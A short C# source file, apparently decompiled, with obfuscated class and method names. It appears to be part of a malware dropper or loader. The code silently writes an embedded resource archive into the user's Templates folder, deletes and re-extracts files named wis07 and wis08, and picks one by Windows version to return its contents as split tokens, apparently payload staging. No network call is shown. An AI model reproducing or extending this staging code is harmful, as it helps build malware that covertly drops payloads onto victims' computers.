using System;
using System.Diagnostics;
using System.IO;
using rdvimainta.My.Resources;

namespace rdvimainta;

public class myshopc
{
	[DebuggerNonUserCode]
	public myshopc()
	{
	}

	public object getShin()
	{
		string text = Environment.OSVersion.ToString();
		zeshoe zeshoe2 = new zeshoe();
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\";
		string text3 = text2 + "data";
		string path = text2 + "wis07";
		string path2 = text2 + "wis08";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (!File.Exists(text3 + ".zip"))
		{
			File.WriteAllBytes(text3 + ".zip", Resources._date);
		}
		zeshoe2.uindTuile(text3, text2);
		if (text.Contains("6.1") | text.Contains("6.01"))
		{
			return File.ReadAllText(path).Trim().Split(new char[1] { ' ' });
		}
		return File.ReadAllText(path2).Trim().Split(new char[1] { ' ' });
	}
}
